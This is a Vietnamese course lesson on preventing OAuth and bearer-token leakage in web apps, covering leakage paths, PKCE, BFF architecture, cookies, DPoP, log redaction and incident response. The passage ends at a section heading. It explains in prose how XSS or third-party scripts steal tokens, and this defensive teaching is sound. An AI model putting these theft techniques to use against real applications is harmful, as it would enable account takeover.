# Token leakage

**Token leakage** xảy ra khi access token, refresh token, session credential hoặc authorization code bị đưa tới nơi không được phép nhận hoặc lưu giữ. Với bearer token, bên nào lấy được token thường có thể sử dụng token đó như client hợp lệ cho tới khi token hết hạn hoặc bị thu hồi. Một token bị lộ trong URL, log, browser storage, JavaScript runtime hay công cụ giám sát có thể biến thành quyền truy cập trực tiếp vào API.

Token leakage không chỉ đến từ một lỗi lập trình. Nó có thể xảy ra qua query string, browser history, Referer header, redirect, analytics, error tracking, console, reverse proxy, cache, extension, XSS hoặc dependency bên thứ ba. Các lớp bảo vệ phải bao phủ cả luồng OAuth, nơi lưu token, cách gửi token, hệ thống log và quy trình thu hồi.

Đối với ứng dụng browser-based, **RFC 10017 (OAuth 2.0 for Browser-Based Applications, BCP 212, August 2026)** mô tả ba kiến trúc theo mức bảo vệ giảm dần: Backend for Frontend (BFF), token-mediating backend và browser-based OAuth client. BFF giữ access/refresh token ở backend và chỉ cấp cookie session cho browser; đây thường là lựa chọn tốt nhất khi kiến trúc sản phẩm cho phép.

Bài học thuộc chương **Browser token security** trong module **Browser Security** (SECURITY_APPLICATION_SECURITY_BROWSER_SECURITY). Nội dung phân tích ranh giới giữa browser, origin, cookie và ứng dụng web; tập trung vào nguồn rò rỉ token, tác động của bearer credential, OAuth redirect, browser storage, BFF, log redaction, token lifecycle và cách kiểm chứng bằng một lab local chỉ dùng token giả.

## 1. Mục tiêu học tập

Sau bài này, bạn có thể:

1. Giải thích token leakage và vì sao bearer token bị lộ có thể được replay.
2. Phân biệt access token, refresh token, ID token, session cookie và authorization code.
3. Nhận diện rò rỉ qua URL query, fragment, browser history, Referer và open redirect.
4. Tìm các điểm lưu hoặc sao chép token trong localStorage, sessionStorage, IndexedDB, memory, Web Worker và Service Worker.
5. Giải thích vì sao XSS hoặc JavaScript bên thứ ba cùng origin có thể đọc token hoặc dùng ứng dụng làm proxy.
6. Thiết kế OAuth Authorization Code flow với PKCE, state/nonce, redirect URI chính xác và callback không tải tài nguyên bên thứ ba.
7. So sánh BFF, token-mediating backend và browser-only client.
8. Áp dụng cookie HttpOnly, Secure, SameSite và CSRF defense khi browser dùng session.
9. Giảm hậu quả token bị lộ bằng expiry ngắn, scope/audience hẹp, refresh token rotation, revocation và sender-constrained token.
10. Thiết kế log/telemetry redaction, phát hiện token exposure và quy trình ứng phó sự cố.
11. Dùng Node.js lab để quan sát query token trong access log, Referer leakage và khả năng JavaScript đọc fragment.

## 2. Token leakage là gì?

Token là credential mà client dùng để chứng minh quyền truy cập. Có nhiều loại token, và không phải token nào cũng có cùng mục đích:

| Loại | Mục đích | Khi bị lộ |
| --- | --- | --- |
| Access token | Gọi resource server/API | Kẻ lấy được token có thể gọi API trong phạm vi token cho phép |
| Refresh token | Xin access token mới | Có thể duy trì quyền truy cập lâu hơn access token, tùy chính sách rotation/revocation |
| ID token | Mang thông tin xác thực người dùng trong OpenID Connect | Có thể lộ dữ liệu danh tính; không dùng ID token thay access token để gọi API |
| Authorization code | Đổi lấy token tại token endpoint | Có thể bị đổi lấy token nếu chưa dùng, chưa hết hạn và kẻ tấn công vượt qua được ràng buộc như PKCE |
| Session cookie | Duy trì phiên đăng nhập với ứng dụng | Có thể cho phép chiếm phiên nếu cookie được gửi và chấp nhận như credential |

### 2.1. Bearer token có nghĩa là ai giữ được thì có thể dùng

Một bearer access token không yêu cầu client chứng minh đang giữ khóa riêng tương ứng. Resource server kiểm tra token, chữ ký/introspection, expiry, scope và audience; nếu token hợp lệ thì request được xử lý theo quyền của token.

~~~http
GET /api/orders HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGciOi...
~~~

Nếu token bị copy khỏi request, log hoặc browser storage, kẻ tấn công có thể gửi lại nó từ một thiết bị khác. TLS bảo vệ token trên đường truyền giữa các đầu cuối TLS, nhưng không ngăn token bị ghi vào log, lấy từ JavaScript runtime hoặc lộ sau khi TLS kết thúc tại proxy.

### 2.2. JWT không phải dữ liệu được mã hóa mặc định

JWT dạng JWS thường là header và payload được Base64URL-encode rồi ký. Người có JWT có thể giải mã phần payload để đọc claim mà không cần secret ký. Chữ ký giúp xác minh tính toàn vẹn và nguồn phát hành; nó không che nội dung.

Không đưa mật khẩu, API secret, dữ liệu cá nhân không cần thiết hoặc private key vào payload JWT với giả định rằng token đã được ký nên nội dung bí mật. Chỉ dùng JWE hoặc cơ chế mã hóa phù hợp khi thực sự cần bảo mật nội dung; ngay cả khi đó vẫn phải bảo vệ token như credential.

### 2.3. Rò rỉ và replay

~~~mermaid
flowchart TD
    A["Token được cấp cho client"] --> B["Token đi qua URL, storage, log hoặc runtime"]
    B --> C{"Bên không được phép lấy được token?"}
    C -->|Không| D["Token tiếp tục được giữ trong trust boundary"]
    C -->|Có| E["Attacker copy token"]
    E --> F["Replay tới resource server"]
    F --> G{"Token còn hạn và quyền còn hiệu lực?"}
    G -->|Có| H["API chấp nhận request theo scope/audience"]
    G -->|Không| I["Request bị từ chối"]
    H --> J["Thu hồi token/session và điều tra phạm vi ảnh hưởng"]
~~~

Rủi ro thực tế phụ thuộc loại token, thời hạn, scope, audience, sender constraint và khả năng thu hồi. Refresh token thường có giá trị cao hơn vì có thể đổi lấy access token mới. Một authorization code có PKCE và chỉ dùng một lần ít nguy hiểm hơn bearer access token dài hạn, nhưng vẫn phải tránh để code rò rỉ.

## 3. Những đường rò rỉ token thường gặp

| Nguồn rò rỉ | Ví dụ | Cách giảm rủi ro |
| --- | --- | --- |
| URL query | /profile?access_token=... | Không đặt access/refresh token trong URL |
| URL fragment | #access_token=... | Tránh implicit flow; xử lý callback tối giản và xóa URL sớm |
| Browser history | Token/code xuất hiện trong URL đã truy cập | Authorization Code + PKCE, callback sạch, không phát token trong URL |
| Referer | Callback page tải ảnh/script/link ngoài | Referrer-Policy no-referrer, không tải tài nguyên bên thứ ba trên callback |
| Access/reverse proxy log | Query string hoặc Authorization header bị ghi | Redact token/cookie/code ở mọi tầng logging |
| Analytics/session replay | URL, DOM, input hoặc request bị ghi lại | Loại callback/auth route khỏi capture và che trường nhạy cảm |
| localStorage/sessionStorage/IndexedDB | JavaScript cùng origin đọc credential | Ưu tiên BFF; giảm lưu persistent trong browser |
| XSS/dependency compromise | Script chạy cùng origin đọc token hoặc gọi API thay user | Chống XSS, CSP, Trusted Types, kiểm soát dependency |
| Console/error reporting | console.log(token) hoặc exception chứa header | Không log credential; lọc breadcrumbs và payload |
| postMessage/BroadcastChannel | Token gửi tới sai origin hoặc listener không tin cậy | Kiểm tra origin, schema và chỉ truyền dữ liệu tối thiểu |
| Cache/Service Worker | Cache response hoặc request có credential | Không cache token; kiểm tra Cache Storage và service worker |
| Clipboard/screenshot/support ticket | Người dùng copy URL/token vào chat hoặc ảnh | Không hiển thị credential; hướng dẫn redact và revoke khi lộ |
| Browser profile/extension/malware | Dữ liệu browser bị đọc từ profile hoặc extension | Hạn chế extension, bảo vệ thiết bị và giảm thời gian sống của token |

## 4. Token trong URL: query và fragment

### 4.1. Query string dễ bị ghi ở nhiều tầng

Ví dụ không an toàn:

~~~text
https://app.example.com/api/orders?access_token=eyJhbGciOi...
~~~

Query string thường xuất hiện trong:

- Browser address bar và history.
- HTTP access log của web server.
- Reverse proxy, CDN, WAF và load balancer log.
- APM trace, error report và monitoring.
- Analytics event hoặc session replay.
- Link được copy, gửi qua chat, email hoặc ticket.
- Referer header của request phát sinh từ trang có URL đó, tùy Referrer Policy.

RFC 6750 không khuyến nghị truyền bearer token trong URI query parameter; RFC 9700 yêu cầu client không truyền access token trong query theo cách này. Dùng Authorization header cho API request hoặc để backend giữ token.

### 4.2. Fragment không được gửi trong HTTP request, nhưng vẫn có thể bị JavaScript đọc

Ví dụ:

~~~text
https://app.example.com/callback#access_token=demo-token
~~~

Phần sau dấu # được browser giữ ở phía client. Nó không được gửi trong HTTP request target tới server và thông thường không được gửi trong Referer header. Tuy nhiên:

- JavaScript cùng origin đọc được location.hash.
- Token có thể nằm trong browser history.
- Script analytics, tag manager hoặc dependency chạy trong trang có thể đọc fragment.
- XSS có thể đọc token và gửi ra ngoài.
- Một số browser implementation issue từng khiến fragment bị lộ trong luồng redirect; RFC 9700 có ghi nhận nguy cơ này.

Vì vậy, fragment không phải nơi lưu access token an toàn. OAuth implicit grant (response_type=token) không còn là lựa chọn khuyến nghị; dùng Authorization Code flow với PKCE để access token được trả qua token endpoint thay vì authorization response URL.

### 4.3. Authorization code trong query cũng cần được bảo vệ

Authorization Code flow thường đưa code và state về redirect URI qua query. Authorization code không phải access token, nhưng vẫn là credential tạm thời có thể bị đổi lấy token nếu kẻ tấn công lấy được code và vượt qua các ràng buộc.

Giảm rủi ro bằng cách:

- Dùng PKCE với code_challenge_method=S256.
- Dùng state ngẫu nhiên, gắn với transaction/browser session và chỉ dùng một lần.
- Với OpenID Connect, dùng nonce và xác minh claim trong ID token.
- Đăng ký redirect URI chính xác; tránh wildcard và open redirect.
- Authorization server phải vô hiệu hóa code sau lần đổi đầu tiên.
- Callback page không tải third-party script, ảnh, font, quảng cáo hoặc widget.
- Đặt Referrer-Policy chặt chẽ cho callback.
- Đọc code/state vào memory rồi loại query khỏi address bar sớm bằng history.replaceState.
- Nếu kiến trúc phù hợp, cân nhắc response mode form_post hoặc để BFF nhận callback và đổi code ở server.

Ví dụ xóa query sau khi lấy các giá trị cần xử lý:

~~~js
const params = new URLSearchParams(location.search);
const code = params.get('code');
const state = params.get('state');

// Lấy giá trị vào memory, sau đó bỏ query khỏi URL ngay.
history.replaceState(null, document.title, location.pathname);

// Sau đó xác minh state và đổi code bằng PKCE.
await verifyOAuthState(state);
await exchangeAuthorizationCode(code);
~~~

Đoạn code chỉ minh họa thứ tự xử lý. Ứng dụng phải bảo đảm state được so sánh với transaction đã lưu và code được đổi bằng đúng PKCE verifier; không được tin state chỉ vì nó có mặt trong query.

### 4.4. history.replaceState không xóa dấu vết đã được ghi

history.replaceState thay URL hiện tại trong browser history. Nó không thể xóa request URL đã đi qua CDN/proxy/server log, không thu hồi token đã bị copy và không xóa dữ liệu analytics đã gửi. Vì vậy, URL cleanup là biện pháp giảm thời gian phơi bày, không phải cách khắc phục một token đã bị lộ.

## 5. Referer leakage và tài nguyên bên thứ ba

Khi trang tải tài nguyên hoặc điều hướng sang URL khác, browser có thể gửi header Referer cho request đích. Nội dung header phụ thuộc Referrer Policy và quan hệ giữa hai origin.

Ví dụ callback:

~~~text
https://app.example.com/oauth/callback?code=one-time-code&state=random-value
~~~

Nếu callback page tải một ảnh, script, iframe hoặc font từ bên ngoài, request đó có thể mang Referer. Với policy mặc định hiện đại strict-origin-when-cross-origin, request same-origin có thể gửi full URL, còn request cross-origin thường chỉ gửi origin. Policy yếu như unsafe-url có thể gửi full URL tới cả origin khác.

RFC 9700 khuyến nghị callback/authorization page không chứa third-party resource hoặc link ngoài và dùng Referrer Policy phù hợp; no-referrer ngăn Referer trên các request phát sinh từ document đó.

### 5.1. Header bảo vệ callback

~~~http
Referrer-Policy: no-referrer
Cache-Control: no-store
Pragma: no-cache
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'; connect-src 'self'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'
~~~

Đây là baseline minh họa cho callback page rất tối giản. Nếu callback cần endpoint hoặc asset cụ thể, hãy thêm nguồn chính xác vào CSP sau khi kiểm kê. Tránh unsafe-inline, wildcard hoặc third-party script trên trang xử lý authorization response.

Cache-Control no-store giúp ngăn cache HTTP lưu response callback theo policy của cache. Nó không xóa URL khỏi history và không thay thế việc redaction log.

### 5.2. Các lỗi dễ mắc

- Dùng tag manager chung trên callback page.
- Nhúng analytics trước khi loại code/state khỏi URL.
- Hiển thị URL callback trong error page hoặc telemetry.
- Redirect sang URL do query parameter điều khiển.
- Cho phép open redirect trên redirect URI đã đăng ký.
- Gửi toàn bộ location.href vào log để chẩn đoán.

## 6. Token trong browser storage và JavaScript runtime

### 6.1. localStorage

localStorage được chia sẻ giữa các tab cùng origin và tồn tại qua lần reload/browser restart. Mọi JavaScript chạy cùng origin có thể đọc nó. Nếu có XSS hoặc dependency bên thứ ba bị compromise, attacker có thể lấy access token và refresh token lưu tại đây.

~~~js
// Dễ bị lấy bởi bất kỳ JavaScript cùng origin nào:
localStorage.setItem('access_token', accessToken);
const token = localStorage.getItem('access_token');
~~~

Không dùng localStorage làm kho mặc định cho authentication token.

### 6.2. sessionStorage

sessionStorage thường giới hạn theo tab và tồn tại tới khi tab/window đóng. Nó giảm một phần thời gian và phạm vi chia sẻ so với localStorage, nhưng vẫn đọc được bởi JavaScript cùng origin trong tab. XSS vẫn có thể lấy token.

Việc dùng sessionStorage thay localStorage không giải quyết được nguyên nhân gốc là mã không tin cậy đang chạy trong execution context của ứng dụng.

### 6.3. IndexedDB

IndexedDB lưu dữ liệu persistent và có thể được dùng bởi trang cùng origin cũng như Service Worker. Nó phù hợp với dữ liệu ứng dụng lớn, nhưng không tạo ranh giới bảo mật trước XSS. JavaScript độc hại cùng origin có thể mở database và đọc record nếu quyền truy cập cho phép.

Browser không bảo đảm mọi dữ liệu trong profile/storage đều được mã hóa at rest. Malware có quyền đọc profile hoặc người có quyền truy cập thiết bị có thể tìm token và session cookie trong dữ liệu lưu cục bộ. Ứng dụng web không thể tự giải quyết toàn bộ rủi ro trên thiết bị; hãy giảm thời gian sống của credential và bảo vệ endpoint/device theo chính sách tổ chức.

### 6.4. In-memory và closure

Giữ access token trong memory thay vì persistent storage giúp token biến mất khi execution context bị hủy. Closure có thể giảm việc mã khác đọc trực tiếp biến token:

~~~js
function createApiClient(initialToken) {
  let token = initialToken;

  return {
    async getProfile() {
      return fetch('/api/profile', {
        headers: {
          Authorization: 'Bearer ' + token,
        },
      });
    },
    updateToken(nextToken) {
      token = nextToken;
    },
  };
}
~~~

Closure không phải sandbox. XSS có thể gọi các hàm hợp lệ để sử dụng token thay cho người dùng; trong môi trường JavaScript phức tạp, prototype poisoning hoặc thay thế API mà closure sử dụng cũng có thể làm lộ tham số. In-memory giảm persistence và một số kiểu exfiltration, nhưng không loại bỏ khả năng malicious code hành động trong browser context.

### 6.5. Web Worker và Service Worker

Web Worker có thể giữ refresh token trong memory và chỉ cung cấp thao tác cần thiết cho main thread. Service Worker có thể trung gian request và giữ token ở context riêng. Các cách này tạo thêm ranh giới truy cập trực tiếp, nhưng:

- Worker vẫn thuộc cùng origin trust boundary.
- XSS có thể gọi message/API mà ứng dụng cho phép.
- Service Worker có lifecycle và quyền intercept request riêng, làm tăng độ phức tạp vận hành.
- Access token trả về main thread vẫn có thể bị lấy.
- Worker không sửa được lỗ hổng cho phép attacker thực thi mã cùng origin.

RFC 10017 phân tích các lựa chọn storage và nhấn mạnh rằng persistent browser storage không ngăn được mã độc cùng origin; in-memory/closure giảm bề mặt nhưng không bảo đảm an toàn khi attacker kiểm soát execution context.

### 6.6. So sánh nhanh

| Cách giữ token | Persistence | JavaScript cùng origin đọc trực tiếp? | Giới hạn chính |
| --- | --- | --- | --- |
| localStorage | Cao | Có | XSS đọc được; chia sẻ giữa các tab |
| sessionStorage | Theo tab | Có | XSS trong tab đọc được |
| IndexedDB | Cao | Có | XSS cùng origin có thể mở database |
| Memory | Theo execution context | Có thể qua biến/API | Mất khi reload; XSS vẫn có thể dùng ứng dụng làm proxy |
| Closure | Theo execution context | Giảm truy cập trực tiếp | Không phải sandbox; API bị thay thế hoặc gọi hàm được expose |
| Web Worker | Theo worker lifecycle | Không đọc trực tiếp memory worker từ main thread | XSS có thể gọi worker qua message và lạm dụng thao tác được expose |
| BFF/server-side session | Token ở backend | Browser không có access/refresh token | Cookie session vẫn cần CSRF defense; BFF phải được bảo vệ |

OWASP Session Management khuyến nghị không lưu authentication token, session ID, JWT hoặc refresh token trong localStorage/sessionStorage vì JavaScript cùng origin có thể đọc; hướng ưu tiên là cookie HttpOnly/Secure/SameSite hoặc BFF.

## 7. XSS và third-party JavaScript là đường lấy token trực tiếp

Same-Origin Policy ngăn một origin đọc tùy tiện dữ liệu của origin khác. Nó không ngăn JavaScript độc hại đã chạy trong origin của ứng dụng đọc dữ liệu của chính origin đó.

Nguồn mã có thể thực thi trong origin gồm:

- DOM XSS, reflected XSS hoặc stored XSS.
- Dependency npm/CDN bị compromise.
- Tag manager, analytics hoặc quảng cáo được cấp quyền script trong trang.
- Script được tải từ host cùng trust boundary nhưng không được quản lý chặt.
- Browser extension có quyền đọc trang.
- Service worker hoặc static asset cùng origin bị thay đổi.

Mã độc có thể:

1. Đọc token từ localStorage/sessionStorage/IndexedDB.
2. Đọc token từ URL query hoặc fragment.
3. Thay thế fetch/XMLHttpRequest để lấy Authorization header.
4. Gọi API hợp lệ qua browser rồi gửi response ra ngoài.
5. Dùng refresh flow của ứng dụng để xin token mới.
6. Đọc dữ liệu trang và thao tác thay người dùng ngay cả khi token không thể trích xuất.

### 7.1. CSP và Trusted Types giảm nguy cơ XSS

Ví dụ CSP baseline:

~~~http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{RANDOM_PER_RESPONSE}'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'; connect-src 'self' https://api.example.com
~~~

Tạo nonce ngẫu nhiên cho mỗi response và chỉ gắn vào script do ứng dụng tin cậy. Không tái sử dụng nonce cố định. Với ứng dụng có thể triển khai, ưu tiên nonce/hash và loại inline script không cần thiết thay vì bật unsafe-inline.

Trusted Types có thể buộc các sink DOM nhạy cảm nhận dữ liệu đã qua policy:

~~~http
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types app
~~~

CSP/Trusted Types giúp giảm đường đưa mã độc vào execution context. Chúng không phải nơi lưu token và không thay thế việc kiểm soát dependency, output encoding, sanitization hoặc rà soát script bên thứ ba.

### 7.2. Giảm quyền của script bên thứ ba

- Không tải script marketing/analytics trên callback page hoặc trang có token trong URL.
- Chỉ dùng vendor đã được phê duyệt và kiểm kê script.
- Dùng Subresource Integrity cho tài nguyên CDN tĩnh khi phù hợp.
- Tách ứng dụng có mức tin cậy khác nhau sang origin riêng.
- Không đưa token vào global variable hoặc DOM attribute.
- Không gửi token qua postMessage trừ khi có giao thức và kiểm tra targetOrigin chặt chẽ; ưu tiên không truyền.
- Với BroadcastChannel, chỉ gửi trạng thái tối thiểu, không broadcast bearer credential.

## 8. OAuth an toàn cho browser-based application

### 8.1. Ưu tiên Authorization Code + PKCE

Với browser-based OAuth client, dùng Authorization Code flow với PKCE S256. Authorization server trả authorization code về redirect URI; client đổi code tại token endpoint bằng code_verifier. Access token được trả từ token endpoint response, không nằm trong URL authorization response.

~~~mermaid
sequenceDiagram
    participant B as Browser app
    participant AS as Authorization server
    participant API as Resource server
    B->>B: Tạo code_verifier và code_challenge S256
    B->>AS: Authorization request + redirect_uri + state + code_challenge
    AS-->>B: Redirect về callback với code + state
    B->>B: Kiểm tra state, giữ code trong memory và dọn URL
    B->>AS: POST token endpoint + code + code_verifier
    AS-->>B: Access token (và có thể refresh token)
    B->>API: HTTPS + Authorization: Bearer
    API-->>B: Protected response
~~~

PKCE ràng buộc authorization code với client đã tạo verifier. Nó bảo vệ code khỏi bị đổi bởi bên chỉ lấy được code; PKCE không làm access token sau khi phát hành trở thành sender-constrained.

### 8.2. Tránh Implicit Grant

OAuth implicit grant trả access token trong authorization response URL, thường ở fragment. Điều này làm tăng nguy cơ token xuất hiện trong browser history, JavaScript runtime và các đường rò rỉ redirect/Referer. RFC 9700 khuyến nghị không dùng implicit grant; chọn authorization code response type để token được trả ở token endpoint.

### 8.3. Ràng buộc redirect URI

- Dùng redirect URI đăng ký chính xác.
- Không chấp nhận redirect destination tùy ý từ query parameter.
- Không để callback endpoint trở thành open redirect.
- Nếu hỗ trợ nhiều authorization server, kiểm tra issuer/authorization server binding để tránh mix-up.
- Gắn state với transaction và browser session; chỉ dùng một lần.
- Với OpenID Connect, xác minh nonce và các claim của ID token.

### 8.4. Callback page phải tối giản

Callback page nên:

- Không tải third-party script, analytics, image, font hoặc iframe.
- Có Referrer-Policy no-referrer.
- Có Cache-Control no-store.
- Không log location.href, query hoặc fragment.
- Đọc code/state vào memory, loại query khỏi URL sớm.
- Xác minh state trước khi tiếp tục token exchange.
- Chỉ redirect tới path nội bộ đã được allowlist.

Nếu BFF xử lý callback, browser có thể điều hướng code tới backend; backend đổi code và giữ token ở server. Browser chỉ nhận session cookie. Cách này tránh để access/refresh token xuất hiện trong JavaScript của ứng dụng.

## 9. Chọn kiến trúc quản lý token

RFC 10017 (BCP 212) mô tả ba pattern cho browser-based OAuth application theo mức bảo vệ giảm dần.

### 9.1. Backend for Frontend (BFF)

Browser giao tiếp với BFF bằng cookie session. BFF thực hiện OAuth Authorization Code flow, giữ access/refresh token ở server và gắn access token vào request khi gọi resource server.

~~~text
Browser -- HttpOnly session cookie --> BFF -- Bearer token --> Resource API
                                      |
                                      +-- Access/refresh token ở server
~~~

Ưu điểm:

- Access/refresh token không được đưa vào JavaScript/browser storage.
- Browser không cần biết bearer token của API.
- Backend có thể áp dụng token rotation, revocation, rate limit và audit tập trung.

Điều cần kiểm soát:

- Cookie session được browser tự gửi nên BFF phải có CSRF defense.
- Cookie cần Secure, HttpOnly, SameSite phù hợp, Path=/ và ưu tiên host-only.
- BFF phải kiểm tra Origin/CSRF token theo thiết kế.
- BFF proxy chỉ được chuyển tiếp tới host/path backend allowlist; không biến BFF thành open proxy làm lộ token.
- BFF trở thành thành phần quan trọng về availability, privacy và bảo mật.

XSS trong frontend vẫn có thể gọi endpoint BFF bằng cookie session của người dùng và dùng browser làm proxy. BFF giảm khả năng lấy bearer token để replay từ thiết bị khác; nó không ngăn mã độc đang chạy trong trang thực hiện hành động trong phiên hiện tại. Vẫn cần chống XSS, CSRF và authorization ở backend.

### 9.2. Token-mediating backend

Backend xử lý OAuth và giữ refresh token, nhưng browser nhận access token để gọi resource server trực tiếp. Cách này giảm nguy cơ refresh token bị lấy nhưng access token vẫn nằm trong browser và có thể bị đánh cắp.

Không cần persistent token storage nếu browser có thể dùng cookie session để xin access token mới từ backend khi cần. Tuy vậy, XSS vẫn có thể gọi endpoint mediation để lấy token hoặc dùng access token hiện tại.

### 9.3. Browser-based OAuth client

Ứng dụng JavaScript trực tiếp thực hiện OAuth và giữ access token/refresh token. Đây là pattern có nhiều trách nhiệm nhất ở phía browser:

- Cần chọn storage phù hợp và giảm persistence.
- Phải bảo vệ execution context khỏi XSS/dependency compromise.
- Phải quản lý refresh token rotation hoặc sender constraint.
- Cần xử lý logout, expiry, revocation và token refresh.
- Cần tránh đưa token vào URL, log hoặc third-party scripts.

### 9.4. Bảng so sánh

| Kiến trúc | Token nằm ở đâu? | Token có lộ trực tiếp cho JavaScript app? | Điểm cần bảo vệ |
| --- | --- | --- | --- |
| BFF | Backend | Không | Cookie session, CSRF, proxy allowlist, BFF security |
| Token-mediating backend | Refresh token ở backend; access token ở browser | Access token có | Endpoint mediation, access token storage/use, XSS |
| Browser-only OAuth client | Browser | Có | XSS, storage, refresh token, logging, token lifecycle |

Nếu hệ thống có backend và có thể proxy API hợp lý, hãy đánh giá BFF trước. Nếu buộc phải để browser giữ access token, giảm thời gian sống và quyền của token, tránh persistent storage khi có thể, và tăng cường bảo vệ execution context.

## 10. Cookie session: tránh token leakage nhưng phải chống CSRF

HttpOnly cookie giúp JavaScript không đọc trực tiếp cookie value. Đây là khác biệt quan trọng so với token trong localStorage. Tuy nhiên, browser tự gửi cookie theo quy tắc cookie, vì vậy cookie-based authentication phải chống CSRF.

Ví dụ:

~~~http
Set-Cookie: __Host-Http-session=opaque-session-id; Path=/; Secure; HttpOnly; SameSite=Strict
~~~

Các thuộc tính:

- Secure: chỉ gửi qua HTTPS.
- HttpOnly: không cho JavaScript đọc cookie.
- SameSite=Strict: giới hạn cookie trong same-site context; chỉ dùng khi luồng đăng nhập và điều hướng của sản phẩm tương thích.
- Path=/: cookie dùng cho toàn host.
- Không có Domain: host-only cookie.
- Prefix __Host-Http- có yêu cầu nghiêm ngặt ở browser hỗ trợ; nếu chưa hỗ trợ đồng đều, cân nhắc __Host- theo khả năng tương thích.

CSRF defense có thể kết hợp SameSite, synchronizer token hoặc double-submit cookie phù hợp, kiểm tra Origin/Referer và yêu cầu custom header cho API cùng origin. HttpOnly không ngăn XSS gọi API bằng browser session; nó ngăn việc đọc cookie trực tiếp, giúp giảm khả năng mang session ra thiết bị khác.

Không đồng nhất cookie không đọc được bằng JavaScript với không thể bị lạm dụng. XSS vẫn có thể thực hiện request trong browser của nạn nhân.

## 11. Giảm hậu quả khi token bị lộ

### 11.1. Access token ngắn hạn

Access token nên có expiry ngắn phù hợp với trải nghiệm và khả năng refresh. Token sống ngắn giảm thời gian replay sau khi bị lộ. Không chọn TTL tùy tiện: cân nhắc thời gian phiên, độ nhạy API, khả năng revoke và chi phí refresh.

### 11.2. Scope và audience tối thiểu

- Chỉ cấp scope cần cho chức năng hiện tại.
- Giới hạn audience vào resource server cụ thể.
- Không dùng một token quyền rộng cho nhiều API không liên quan.
- Resource server phải kiểm tra issuer, audience, expiry, signature/introspection và quyền trên từng request.

Nếu token bị lộ, scope/audience hẹp giảm phần tài nguyên mà attacker có thể truy cập.

### 11.3. Refresh token rotation và reuse detection

Với public client, refresh token cần sender constraint hoặc rotation theo yêu cầu của RFC 9700. Khi rotation, mỗi lần refresh cấp refresh token mới và vô hiệu token cũ. Nếu token cũ bị dùng lại, authorization server có thể phát hiện dấu hiệu token theft và revoke token family/session theo chính sách.

Không lưu refresh token trong localStorage. Nếu cần browser client trực tiếp quản lý OAuth, hãy đánh giá BFF/token-mediating backend hoặc cơ chế worker/sender constraint trước khi dùng persistent browser storage.

### 11.4. Sender-constrained token và DPoP

DPoP ràng buộc access/refresh token với public key của client. Client gửi DPoP proof được ký bằng private key tương ứng; resource server xác minh proof cùng token. Khi attacker chỉ lấy được bearer token nhưng không lấy được private key, token bị đánh cắp khó replay từ thiết bị khác.

DPoP là defense-in-depth:

- Không thay thế HTTPS.
- Không ngăn XSS thực hiện request trong browser context nếu mã độc có thể gọi key/signing API.
- Non-exportable key giảm khả năng trích xuất private key, nhưng malicious code cùng origin vẫn có thể yêu cầu browser tạo proof trong lúc ứng dụng hoạt động.
- Server cần kiểm tra proof freshness/replay, URI, HTTP method, token binding và nonce theo cấu hình.

RFC 9449 định nghĩa DPoP và giới hạn của nó trước mã độc chạy trong execution context của client.

## 12. Log, telemetry và cache: nơi token thường bị quên

### 12.1. Redact ở mọi tầng

Không chỉ application log mới cần redaction. Kiểm tra:

- Web server access log.
- Reverse proxy, API gateway, CDN và WAF.
- APM distributed trace và request/response capture.
- Error tracking, crash reporting và breadcrumbs.
- Analytics và session replay.
- WebSocket frame logging.
- Browser console và debug overlay.
- Support bundle, HAR export và screenshot.

Các trường cần che hoặc bỏ khỏi log:

- Authorization.
- Cookie và Set-Cookie.
- access_token, refresh_token, id_token.
- code, code_verifier, state, nonce khi cần bảo vệ transaction.
- Query/body field có chứa credential.

Không ghi toàn bộ URL callback nếu có code hoặc state. Nếu cần correlation, dùng request ID hoặc transaction ID không phải credential. Chỉ giữ metadata tối thiểu, giới hạn thời gian lưu và quyền truy cập log.

### 12.2. Cache-Control

Đối với response chứa token hoặc dữ liệu nhạy cảm:

~~~http
Cache-Control: no-store
Pragma: no-cache
~~~

Không dựa vào header này để bảo vệ token ở JavaScript memory hoặc custom Cache Storage. Hãy kiểm tra Service Worker có tự lưu request/response hay không và tránh đưa token vào cache key, cache metadata hoặc offline response.

### 12.3. Không log token để debug

Tránh:

~~~js
console.log('access token', accessToken);
console.log('request headers', request.headers);
console.log('callback URL', location.href);
~~~

Thay vào đó log:

~~~js
console.info('API request started', {
  requestId,
  endpoint: '/api/orders',
  authenticated: true,
});
~~~

Không dùng prefix/suffix token để debug nếu không có quy trình rõ ràng. Với bearer credential, một phần token đôi khi vẫn đủ giúp liên kết các bản ghi hoặc hỗ trợ tấn công khi kết hợp nguồn khác.

## 13. Phát hiện và ứng phó khi token bị lộ

### 13.1. Dấu hiệu cần điều tra

- Token xuất hiện trong query string hoặc browser history.
- Log/APM chứa Authorization, Cookie hoặc token response body.
- Token được dùng từ IP, ASN, thiết bị hoặc khu vực bất thường.
- Có refresh token reuse sau khi đã rotation.
- API bị gọi với scope không phù hợp hành vi người dùng.
- OAuth callback tải tài nguyên bên thứ ba.
- Có script/dependency mới trên trang nhạy cảm.
- Có session replay/error report chứa URL hoặc header credential.

Không kết luận token đã bị sử dụng chỉ từ việc nó xuất hiện trong log; cần phân biệt log nội bộ có kiểm soát với nơi người không được phép có thể truy cập.

### 13.2. Quy trình xử lý

1. **Xác định loại credential:** access token, refresh token, authorization code, ID token hay session cookie.
2. **Xác định nơi lộ:** URL, Referer, log, browser storage, JavaScript, extension, cache hoặc third-party script.
3. **Đánh giá thời gian và quyền:** expiry, scope, audience, issuer, user/session và resource server.
4. **Thu hồi:** revoke access/refresh token hoặc token family, đóng session và yêu cầu đăng nhập lại khi cần.
5. **Xoay credential:** rotate refresh token, client secret hoặc signing key nếu chúng cũng bị lộ; không rotate khóa không liên quan một cách tùy tiện.
6. **Ngăn tái diễn:** redaction log, bỏ token khỏi URL, sửa callback, loại script độc hại hoặc vá XSS.
7. **Kiểm tra truy cập:** rà API audit log, refresh history, session activity và dữ liệu đã bị truy cập/thay đổi.
8. **Làm sạch dấu vết:** xử lý log/telemetry theo retention và incident policy; không giả định history.replaceState đã xóa các bản sao.
9. **Thông báo theo quy trình:** đánh giá nghĩa vụ thông báo người dùng, đối tác hoặc cơ quan quản lý theo chính sách tổ chức.
10. **Xác minh khôi phục:** kiểm thử lại luồng đăng nhập, token refresh, logout, callback và logging sau khi deploy.

### 13.3. Thu hồi access token không phải lúc nào cũng tức thời

